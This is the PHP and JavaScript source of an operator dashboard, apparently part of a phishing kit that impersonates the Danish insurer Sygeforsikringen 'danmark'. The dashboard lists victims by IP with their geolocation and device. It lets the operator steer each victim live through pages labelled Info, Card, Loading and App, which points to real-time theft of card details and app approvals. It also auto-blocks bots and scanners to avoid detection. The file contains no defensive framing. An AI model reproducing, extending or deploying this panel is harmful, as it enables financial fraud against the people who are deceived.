<?php
session_start();
require_once 'config.php';

// V√©rifier si l'utilisateur est connect√©
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // Afficher le formulaire de connexion
    $error = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'] ?? '';
        
        if ($password === ADMIN_PASSWORD) {
            $_SESSION['admin_logged_in'] = true;
            header('Location: admin.php');
            exit;
        } else {
            $error = 'Forkert adgangskode';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="da">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login | Sygeforsikringen "danmark"</title>
        <link rel="icon" type="image/x-icon" href="favicon.ico">
        <link rel="icon" type="image/svg+xml" href="favicon.svg">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">
        <link rel="stylesheet" href="css/style.css">
    </head>
    <body>
        <div class="login-container">
            <h1 style="text-align: center; margin-bottom: 30px;">üîê Admin Panel</h1>
            
            <?php if ($error): ?>
                <div class="error-message" style="display: block; text-align: center; margin-bottom: 20px;">
                    ‚ö† <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <div class="form-group">
                    <label>Adgangskode</label>
                    <input type="password" name="password" required autofocus>
                </div>
                <button type="submit" class="btn">Log ind</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// D√©connexion
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard | Sygeforsikringen</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f7fa;
            color: #333;
        }

        .header {
            background: white;
            padding: 20px 40px;
            border-bottom: 1px solid #e1e8ed;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header-icon {
            font-size: 32px;
        }

        .header-title {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .active-count {
            color: #10b981;
            font-weight: 600;
            font-size: 16px;
        }

        .logout-btn {
            color: #6b7280;
            text-decoration: none;
            font-size: 15px;
            padding: 8px 16px;
            border-radius: 6px;
            transition: background 0.2s;
        }

        .logout-btn:hover {
            background: #f3f4f6;
        }

        .main-container {
            max-width: 1400px;
            margin: 40px auto;
            padding: 0 40px;
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 30px;
        }

        .panel {
            background: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .panel-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }

        .panel-subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 25px;
        }

        .visitor-table {
            margin-bottom: 30px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }

        .table-title {
            background: #f9fafb;
            padding: 12px 16px;
            margin: 0;
            font-size: 16px;
            font-weight: 600;
            border-bottom: 1px solid #e5e7eb;
            color: #374151;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background-color 0.2s;
        }

        .table-title:hover {
            background: #f3f4f6;
        }

        .table-toggle {
            font-size: 14px;
            color: #6b7280;
            transition: transform 0.2s;
        }

        .table-toggle.collapsed {
            transform: rotate(-90deg);
        }

        .visitor-count {
            font-weight: 500;
            color: #6b7280;
            font-size: 14px;
        }

        .visitors-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
            padding: 12px;
            min-height: 60px;
            transition: max-height 0.3s ease-out, opacity 0.2s;
            overflow: hidden;
        }

        .visitors-list.collapsed {
            max-height: 0;
            padding: 0 12px;
            opacity: 0;
        }

        .visitors-list:empty::after {
            content: "No visitors";
            color: #9ca3af;
            text-align: center;
            padding: 20px;
            font-style: italic;
        }

        .visitor-card {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 16px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .visitor-card:hover {
            border-color: #3b82f6;
            box-shadow: 0 2px 8px rgba(59,130,246,0.1);
        }

        .visitor-card.selected {
            border-color: #3b82f6;
            background: #eff6ff;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            flex-shrink: 0;
        }

        .status-dot.online {
            background: #10b981;
            box-shadow: 0 0 0 3px rgba(16,185,129,0.2);
        }

        .status-dot.waiting {
            background: #f59e0b;
            box-shadow: 0 0 0 3px rgba(245,158,11,0.2);
        }

        .status-dot.offline {
            background: #9ca3af;
        }

        .status-dot.blocked {
            background: #ef4444;
        }

        .visitor-info {
            flex: 1;
        }

        .visitor-ip {
            font-weight: 600;
            font-size: 15px;
            color: #1a1a1a;
            margin-bottom: 4px;
        }

        .visitor-meta {
            font-size: 13px;
            color: #6b7280;
        }

        .control-panel-right {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .control-section {
            text-align: center;
            color: #9ca3af;
            padding: 60px 20px;
        }

        .control-section.active {
            padding: 0;
        }

        .control-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .control-btn {
            padding: 14px 20px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            background: white;
            cursor: pointer;
            font-size: 15px;
            font-weight: 500;
            transition: all 0.2s;
            text-align: left;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .control-btn:hover {
            border-color: #3b82f6;
            background: #eff6ff;
        }

        .control-btn.danger {
            border-color: #fee2e2;
            color: #ef4444;
        }

        .control-btn.danger:hover {
            border-color: #ef4444;
            background: #fef2f2;
        }

        .btn-icon {
            font-size: 18px;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #9ca3af;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #9ca3af;
        }

        @media (max-width: 1024px) {
            .main-container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <div class="header-icon">üíé</div>
            <div class="header-title">Admin Dashboard</div>
        </div>
        <div class="header-right">
            <div class="active-count">
                <span id="activeCount">0</span> Active Visitors 
                <span id="updateIndicator" style="color: #10b981; font-size: 12px;">‚óè</span>
                <span id="botCount" style="margin-left: 15px; color: #ef4444;">ü§ñ <span id="botCountNumber">0</span> Bots Blocked</span>
            </div>
            <a href="?logout=1" class="logout-btn">Logout</a>
        </div>
    </div>

    <div class="main-container">
        <!-- Left Panel: Visitor Tables -->
        <div class="panel">
            <h2 class="panel-title">Visitor Control Center</h2>
            <p class="panel-subtitle">Organized by status: Waiting, Online, Offline, Blocked</p>
            
            <!-- Waiting Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('waitingVisitors')">
                    <span>üü§ Waiting Visitors <span id="waitingCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle">‚ñº</span>
                </h3>
                <div id="waitingVisitors" class="visitors-list">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Online Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('onlineVisitors')">
                    <span>üü¢ Online Visitors <span id="onlineCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle">‚ñº</span>
                </h3>
                <div id="onlineVisitors" class="visitors-list">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Offline Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('offlineVisitors')">
                    <span>‚ö™ Offline Visitors <span id="offlineCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">‚ñ∂</span>
                </h3>
                <div id="offlineVisitors" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>

            <!-- Blocked Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('blockedVisitors')">
                    <span>üî¥ Blocked Visitors <span id="blockedCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">‚ñ∂</span>
                </h3>
                <div id="blockedVisitors" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>
            
            <!-- Auto-Blocked Bots Table -->
            <div class="visitor-table">
                <h3 class="table-title" onclick="toggleTable('autoBlockedBots')">
                    <span>ü§ñ Auto-Blocked Bots <span id="autoBlockedCount" class="visitor-count">(0)</span></span>
                    <span class="table-toggle collapsed">‚ñ∂</span>
                    <button class="control-btn" onclick="scanForBots()" style="margin-left: 10px; padding: 3px 8px; font-size: 11px; border-radius: 4px;">
                        üîç Scan
                    </button>
                </h3>
                <div id="autoBlockedBots" class="visitors-list collapsed">
                    <div class="loading">Loading...</div>
                </div>
            </div>
        </div>

        <!-- Right Panel: Control Buttons -->
        <div class="panel control-panel-right">
            <h2 class="panel-title">Registration Flow Control</h2>
            <p class="panel-subtitle">Select a visitor to control their registration flow</p>
            
            <div id="controlSection" class="control-section">
                Select a visitor to control their registration flow
            </div>
            
            <!-- Visitor Details Panel -->
            <div id="visitorDetails" class="visitor-details-panel" style="display:none; margin-top: 20px;">
                <h3 class="panel-title">üîç Visitor Details</h3>
                <table style="width: 100%; border-collapse: collapse;">
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">üåê IP Address</th>
                        <td style="padding: 8px;" id="detailIp"></td>
                    </tr>
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">üîó Source</th>
                        <td style="padding: 8px;" id="detailSource"></td>
                    </tr>
                    <tr style="border-bottom: 1px solid #e5e7eb;">
                        <th style="text-align: left; padding: 8px; color: #6b7280;">üì± Device</th>
                        <td style="padding: 8px; font-size: 12px;" id="detailDevice"></td>
                    </tr>
                    <tr>
                        <th style="text-align: left; padding: 8px; color: #6b7280;">üìç Location & ISP</th>
                        <td style="padding: 8px; font-size: 12px;" id="detailLocation">
                            <div>üîÑ Loading location...</div>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <script>
        let selectedIP = null;
        let visitors = [];
        
        // Variables pour le suivi des nouveaux visiteurs
        let previousVisitorCount = 0;
        let audioContext = null;

        // Initialiser l'audio
        function initAudio() {
            try {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
            } catch (e) {
                console.log('Audio not supported');
            }
        }

        // Jouer un son de notification
        function playNotificationSound() {
            if (!audioContext) return;
            
            try {
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
                oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.3);
            } catch (e) {
                console.log('Error playing sound:', e);
            }
        }

        // Charger les visiteurs
        function loadVisitors() {
            // Animer l'indicateur de mise √† jour
            const indicator = document.getElementById('updateIndicator');
            if (indicator) {
                indicator.style.color = '#f59e0b'; // Orange pendant le chargement
            }
            
            fetch('api/get_visitors.php')
                .then(response => response.json())
                .then(data => {
                    const currentVisitorCount = data.length;
                    
                    // V√©rifier s'il y a de nouveaux visiteurs
                    if (previousVisitorCount > 0 && currentVisitorCount > previousVisitorCount) {
                        playNotificationSound();
                        
                        // Afficher une notification visuelle
                        const notification = document.createElement('div');
                        notification.style.cssText = `
                            position: fixed;
                            top: 20px;
                            right: 20px;
                            background: #4CAF50;
                            color: white;
                            padding: 15px;
                            border-radius: 5px;
                            z-index: 1000;
                            font-weight: bold;
                            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
                        `;
                        notification.textContent = 'üîî Nouveau visiteur d√©tect√©!';
                        document.body.appendChild(notification);
                        
                        setTimeout(() => {
                            document.body.removeChild(notification);
                        }, 3000);
                    }
                    
                    previousVisitorCount = currentVisitorCount;
                    visitors = data;
                    renderVisitors();
                    updateActiveCount();
                    
                    // Indicateur vert apr√®s chargement r√©ussi
                    const indicator = document.getElementById('updateIndicator');
                    if (indicator) {
                        indicator.style.color = '#10b981'; // Vert apr√®s succ√®s
                    }
                })
                .catch(error => {
                    console.error('Error loading visitors:', error);
                    
                    // Indicateur rouge en cas d'erreur
                    const indicator = document.getElementById('updateIndicator');
                    if (indicator) {
                        indicator.style.color = '#ef4444'; // Rouge en cas d'erreur
                    }
                });
        }

        // Rendre la liste des visiteurs dans des tables s√©par√©es
        function renderVisitors() {
            // S√©parer les visiteurs par statut - les visiteurs bloqu√©s restent dans leur cat√©gorie normale
            const waitingVisitors = visitors.filter(v => v.status === 'waiting');
            const onlineVisitors = visitors.filter(v => v.status === 'online');
            const offlineVisitors = visitors.filter(v => v.status === 'offline');
            
            // Les visiteurs bloqu√©s sont seulement ceux qui sont actuellement en ligne/waiting ET bloqu√©s
            const activeBlockedVisitors = visitors.filter(v => v.blocked === true && (v.status === 'online' || v.status === 'waiting'));

            // Mettre √† jour les compteurs
            document.getElementById('waitingCount').textContent = `(${waitingVisitors.length})`;
            document.getElementById('onlineCount').textContent = `(${onlineVisitors.length})`;
            document.getElementById('offlineCount').textContent = `(${offlineVisitors.length})`;
            document.getElementById('blockedCount').textContent = `(${activeBlockedVisitors.length})`;

            // Rendre chaque table
            renderVisitorTable('waitingVisitors', waitingVisitors, 'waiting');
            renderVisitorTable('onlineVisitors', onlineVisitors, 'online');
            renderVisitorTable('offlineVisitors', offlineVisitors, 'offline');
            renderVisitorTable('blockedVisitors', activeBlockedVisitors, 'blocked');
        }

        // Rendre une table sp√©cifique (optimis√© pour √©viter le rechargement visuel)
        function renderVisitorTable(containerId, visitorList, status) {
            const container = document.getElementById(containerId);
            
            if (visitorList.length === 0) {
                if (container.innerHTML !== '<div class="empty-state">No visitors</div>') {
                    container.innerHTML = '<div class="empty-state">No visitors</div>';
                }
                return;
            }

            const statusClass = status;
            
            // Cr√©er un map des visiteurs existants pour mise √† jour efficace
            const existingCards = {};
            container.querySelectorAll('.visitor-card').forEach(card => {
                const ip = card.getAttribute('data-ip');
                if (ip) existingCards[ip] = card;
            });
            
            // Cr√©er un set des IPs actuels
            const currentIPs = new Set(visitorList.map(v => v.ip));
            
            // Supprimer les cartes qui n'existent plus
            Object.keys(existingCards).forEach(ip => {
                if (!currentIPs.has(ip)) {
                    existingCards[ip].remove();
                    delete existingCards[ip];
                }
            });
            
            // Fonction pour convertir les noms de pages en noms avec emojis
            function getPageDisplayName(pageName) {
                const pageNames = {
                    'page1': 'üìù Info',
                    'info': 'üìù Info',
                    'page2': 'üí≥ Card',
                    'card': 'üí≥ Card',
                    'page3': '‚è≥ Loading',
                    'loading': '‚è≥ Loading',
                    'page4': 'üì± App',
                    'app': 'üì± App',
                    'page5': 'üéâ Thank You',
                    'thankyou': 'üéâ Thank You',
                    'index': 'üè† Index'
                };
                return pageNames[pageName] || `üìÑ ${pageName}`;
            }
            
            // Mettre √† jour ou cr√©er les cartes
            visitorList.forEach((visitor, index) => {
                const pageText = getPageDisplayName(visitor.current_page) || '‚ùì Unknown';
                const lastSeen = visitor.last_seen ? new Date(visitor.last_seen * 1000).toLocaleTimeString() : 'Unknown';
                
                let card = existingCards[visitor.ip];
                
                if (card) {
                    // Mettre √† jour la carte existante seulement si n√©cessaire
                    const ipElement = card.querySelector('.visitor-ip');
                    const metaElement = card.querySelector('.visitor-meta');
                    
                    // Ajouter une indication si le visiteur est bloqu√©
                    const blockedIndicator = visitor.blocked ? ' üö´' : '';
                    const newMeta = visitor.blocked ? `${pageText} ‚Ä¢ Last seen: ${lastSeen} ‚Ä¢ BLOCKED` : `${pageText} ‚Ä¢ Last seen: ${lastSeen}`;
                    const newIpText = `${visitor.ip}${blockedIndicator}`;
                    
                    if (ipElement && ipElement.textContent !== newIpText) {
                        ipElement.textContent = newIpText;
                    }
                    
                    if (metaElement && metaElement.textContent !== newMeta) {
                        metaElement.textContent = newMeta;
                    }
                    
                    // Mettre √† jour la classe selected
                    if (selectedIP === visitor.ip) {
                        if (!card.classList.contains('selected')) {
                            card.classList.add('selected');
                        }
                    } else {
                        if (card.classList.contains('selected')) {
                            card.classList.remove('selected');
                        }
                    }
                    
                    // S'assurer que la carte est √† la bonne position
                    const currentIndex = Array.from(container.children).indexOf(card);
                    if (currentIndex !== index) {
                        if (index >= container.children.length) {
                            container.appendChild(card);
                        } else {
                            container.insertBefore(card, container.children[index]);
                        }
                    }
                } else {
                    // Cr√©er une nouvelle carte
                    const newCard = document.createElement('div');
                    newCard.className = `visitor-card ${selectedIP === visitor.ip ? 'selected' : ''}`;
                    newCard.setAttribute('data-ip', visitor.ip);
                    newCard.onclick = () => selectVisitor(visitor.ip);
                    
                    // Ajouter une indication si le visiteur est bloqu√©
                    const blockedIndicator = visitor.blocked ? ' üö´' : '';
                    const metaText = visitor.blocked ? `${pageText} ‚Ä¢ Last seen: ${lastSeen} ‚Ä¢ BLOCKED` : `${pageText} ‚Ä¢ Last seen: ${lastSeen}`;
                    
                    newCard.innerHTML = `
                        <div class="status-dot ${statusClass}"></div>
                        <div class="visitor-info">
                            <div class="visitor-ip">${visitor.ip}${blockedIndicator}</div>
                            <div class="visitor-meta">${metaText}</div>
                        </div>

                    `;
                    
                    if (index >= container.children.length) {
                        container.appendChild(newCard);
                    } else {
                        container.insertBefore(newCard, container.children[index]);
                    }
                }
            });
        }

        // S√©lectionner un visiteur
        function selectVisitor(ip) {
            selectedIP = ip;
            renderVisitors();
            showControls();
            showVisitorDetails();
        }

        // Afficher les d√©tails du visiteur
        function showVisitorDetails() {
            const visitor = visitors.find(v => v.ip === selectedIP);
            if (!visitor) return;

            document.getElementById('visitorDetails').style.display = 'block';
            document.getElementById('detailIp').textContent = visitor.ip;
            document.getElementById('detailSource').textContent = visitor.source || 'Direct';
            
            // Analyser le User-Agent pour d√©terminer le type d'appareil
            const userAgent = visitor.user_agent || 'Unknown';
            let deviceType = 'üñ•Ô∏è PC';
            let deviceInfo = userAgent;
            
            if (userAgent.toLowerCase().includes('mobile') || 
                userAgent.toLowerCase().includes('android') || 
                userAgent.toLowerCase().includes('iphone')) {
                deviceType = 'üì± Mobile';
            } else if (userAgent.toLowerCase().includes('tablet') || 
                       userAgent.toLowerCase().includes('ipad')) {
                deviceType = 'üì± Tablet';
            }
            
            // Extraire le navigateur
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            // Extraire l'OS
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'macOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
            
            document.getElementById('detailDevice').innerHTML = `
                <div><strong>${deviceType}</strong></div>
                <div>üåê ${browser} on ${os}</div>
                <div style="font-size: 11px; color: #666; margin-top: 5px;">${userAgent}</div>
            `;
            
            // Obtenir des informations sur l'IP (pays, fournisseur)
            getIPInfo(visitor.ip);
        }
        
        // Fonction pour obtenir le drapeau du pays
        function getCountryFlag(countryCode) {
            const flags = {
                'US': 'üá∫üá∏', 'FR': 'üá´üá∑', 'DE': 'üá©üá™', 'GB': 'üá¨üáß', 'ES': 'üá™üá∏', 'IT': 'üáÆüáπ',
                'CA': 'üá®üá¶', 'AU': 'üá¶üá∫', 'JP': 'üáØüáµ', 'CN': 'üá®üá≥', 'IN': 'üáÆüá≥', 'BR': 'üáßüá∑',
                'RU': 'üá∑üá∫', 'MX': 'üá≤üáΩ', 'NL': 'üá≥üá±', 'SE': 'üá∏üá™', 'NO': 'üá≥üá¥', 'DK': 'üá©üá∞',
                'MA': 'üá≤üá¶', 'DZ': 'üá©üáø', 'TN': 'üáπüá≥', 'EG': 'üá™üá¨', 'SA': 'üá∏üá¶', 'AE': 'üá¶üá™'
            };
            return flags[countryCode.toUpperCase()] || 'üåç';
        }
        
        // Fonction pour obtenir des informations sur l'IP
        async function getIPInfo(ip) {
            try {
                // Utiliser notre API PHP c√¥t√© serveur pour √©viter les probl√®mes CORS
                const response = await fetch(`api/get_ip_location.php?ip=${encodeURIComponent(ip)}`);
                const data = await response.json();
                
                if (data.success) {
                    const locationInfo = `${data.city}, ${data.region}, ${data.country}`;
                    const countryFlag = data.country_code ? getCountryFlag(data.country_code) : 'üåç';
                    
                    document.getElementById('detailLocation').innerHTML = `
                        <div><strong>${countryFlag} ${locationInfo}</strong></div>
                        <div>üè¢ ${data.isp}</div>
                        <div style="font-size: 10px; color: #888; margin-top: 3px;">üì° ${data.asn}</div>
                    `;
                } else {
                    document.getElementById('detailLocation').innerHTML = '<div>üìç Location: Information unavailable</div>';
                }
                
            } catch (error) {
                console.error('Location API error:', error);
                document.getElementById('detailLocation').innerHTML = '<div>üìç Location: Error loading</div>';
            }
        }

        // Afficher les contr√¥les (optimis√© pour √©viter le rechargement)
        function showControls() {
            const visitor = visitors.find(v => v.ip === selectedIP);
            if (!visitor) return;

            const isBlocked = visitor.blocked === true;
            
            const controlSection = document.getElementById('controlSection');
            
            // V√©rifier si les contr√¥les sont d√©j√† affich√©s pour ce visiteur
            const currentIP = controlSection.getAttribute('data-current-ip');
            if (currentIP === selectedIP) {
                // Mettre √† jour seulement le bouton de blocage si n√©cessaire
                const blockBtn = controlSection.querySelector('.control-btn.danger');
                if (blockBtn) {
                    const expectedText = isBlocked ? 'Unblock IP' : 'Block IP';
                    const currentText = blockBtn.querySelector('span:last-child').textContent;
                    if (currentText !== expectedText) {
                        blockBtn.querySelector('span:last-child').textContent = expectedText;
                        blockBtn.querySelector('.btn-icon').textContent = isBlocked ? '‚úÖ' : 'üö´';
                    }
                }
                return;
            }
            
            controlSection.className = 'control-section active';
            controlSection.setAttribute('data-current-ip', selectedIP);
            controlSection.innerHTML = `
                <div class="control-buttons">
                    <button class="control-btn" onclick="redirectTo('index')">
                        <span class="btn-icon">üè†</span>
                        <span>Redirect to Index</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('info')">
                        <span class="btn-icon">üìù</span>
                        <span>Redirect to Info</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('card')">
                        <span class="btn-icon">üí≥</span>
                        <span>Redirect to Card</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('loading')">
                        <span class="btn-icon">‚è≥</span>
                        <span>Redirect to Loading</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('app')">
                        <span class="btn-icon">üì±</span>
                        <span>Redirect to App</span>
                    </button>
                    <button class="control-btn" onclick="redirectTo('thankyou')">
                        <span class="btn-icon">üéâ</span>
                        <span>Redirect to Thank You</span>
                    </button>
                    <button class="control-btn" onclick="forceRedirect('${visitor.ip}')">
                        <span class="btn-icon">‚ö°</span>
                        <span>Force Immediate Redirect</span>
                    </button>
                    <button class="control-btn danger" onclick="toggleBlock()">
                        <span class="btn-icon">${isBlocked ? '‚úì' : 'üö´'}</span>
                        <span>${isBlocked ? 'Unblock IP' : 'Block IP'}</span>
                    </button>
                </div>
            `;
        }

        // Rediriger un visiteur
        function redirectTo(page) {
            if (!selectedIP) return;

            fetch('api/force_redirect.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: selectedIP, redirect: page})
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(`‚úÖ Visitor ${selectedIP} will be redirected to ${page} immediately!`);
                    // Recharger la liste pour voir le changement
                    setTimeout(() => {
                        loadVisitors();
                    }, 500);
                } else {
                    alert(`‚ùå Error: ${data.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                alert(`‚ùå Network error: ${error.message}`);
            });
        }

        // Bloquer/d√©bloquer un IP
        function toggleBlock() {
            if (!selectedIP) return;

            const visitor = visitors.find(v => v.ip === selectedIP);
            const action = visitor.blocked === true ? 'unblock' : 'block';

            fetch('api/block_ip.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: selectedIP, action: action})
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    loadVisitors();
                    showControls();
                } else {
                    alert(`‚ùå Error: ${data.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                alert(`‚ùå Network error: ${error.message}`);
            });
        }

        // Forcer la redirection imm√©diate
        function forceRedirect(ip) {
            if (!ip) return;
            
            // Ouvrir la page de redirection forc√©e dans un nouvel onglet
            const forceUrl = `force_redirect.php?ip=${encodeURIComponent(ip)}`;
            window.open(forceUrl, '_blank');
            
            alert(`Force redirect initiated for IP: ${ip}`);
        }

        // Mettre √† jour le compteur
        function updateActiveCount() {
            const activeCount = visitors.filter(v => v.status === 'online' || v.status === 'waiting').length;
            document.getElementById('activeCount').textContent = activeCount;
        }

        // Fonction pour plier/d√©plier les tables
        function toggleTable(tableId) {
            const table = document.getElementById(tableId);
            const toggle = table.parentElement.querySelector('.table-toggle');
            
            if (table.classList.contains('collapsed')) {
                table.classList.remove('collapsed');
                toggle.classList.remove('collapsed');
                toggle.textContent = '‚ñº';
            } else {
                table.classList.add('collapsed');
                toggle.classList.add('collapsed');
                toggle.textContent = '‚ñ∂';
            }
        }

        // Initialiser l'audio et charger les visiteurs au d√©marrage
        initAudio();
        loadVisitors();
        loadBlockedBots();
        updateBotCount();
        
        // Charger les bots bloqu√©s
        function loadBlockedBots() {
            fetch('api/get_blocked_bots.php?action=list')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('autoBlockedBots');
                    document.getElementById('autoBlockedCount').textContent = `(${data.length})`;
                    
                    if (data.length === 0) {
                        container.innerHTML = '<div class="empty-state">No bots detected</div>';
                        return;
                    }
                    
                    container.innerHTML = data.map(bot => `
                        <div class="visitor-card">
                            <div class="status-dot blocked"></div>
                            <div class="visitor-info">
                                <div class="visitor-ip">ü§ñ ${bot.ip}</div>
                                <div class="visitor-meta">${bot.reason} ‚Ä¢ ${bot.timestamp}</div>
                                <div style="font-size: 10px; color: #666; margin-top: 2px;">
                                    ${bot.user_agent.substring(0, 80)}...
                                </div>
                            </div>
                        </div>
                    `).join('');
                })
                .catch(error => {
                    console.error('Error loading blocked bots:', error);
                });
        }
        
        // Mettre √† jour le compteur de bots
        function updateBotCount() {
            fetch('api/get_blocked_bots.php?action=count')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('botCountNumber').textContent = data.today;
                })
                .catch(error => {
                    console.error('Error updating bot count:', error);
                });
        }
        
        // Scanner manuellement pour les bots
        function scanForBots() {
            const button = event.target;
            const originalText = button.textContent;
            button.textContent = 'üîÑ Scanning...';
            button.disabled = true;
            
            fetch('api/get_blocked_bots.php?action=scan')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert(`‚úÖ ${data.message}`);
                        loadBlockedBots();
                        loadVisitors();
                        updateBotCount();
                    } else {
                        alert('‚ùå Error during scan');
                    }
                })
                .catch(error => {
                    console.error('Error scanning for bots:', error);
                    alert('‚ùå Network error during scan');
                })
                .finally(() => {
                    button.textContent = originalText;
                    button.disabled = false;
                });
        }
        
        // Rafra√Æchir toutes les 2 secondes pour un panneau plus dynamique
        setInterval(() => {
            loadVisitors(); // Recharger les visiteurs automatiquement
            updateBotCount(); // Mettre √† jour le compteur de bots
            
            // Mettre √† jour les contr√¥les si un visiteur est s√©lectionn√©
            if (selectedIP) {
                showControls();
                showVisitorDetails();
            }
        }, 2000);
        
        // Charger les bots bloqu√©s toutes les 10 secondes
        setInterval(() => {
            loadBlockedBots();
        }, 10000);
        
        // Activer l'audio au premier clic (requis par les navigateurs)
        document.addEventListener('click', function() {
            if (audioContext && audioContext.state === 'suspended') {
                audioContext.resume();
            }
        }, { once: true });
    </script>

<script>
// Les visiteurs bloqu√©s sont maintenant g√©r√©s par la fonction renderVisitors() principale
</script>

</body>
</html>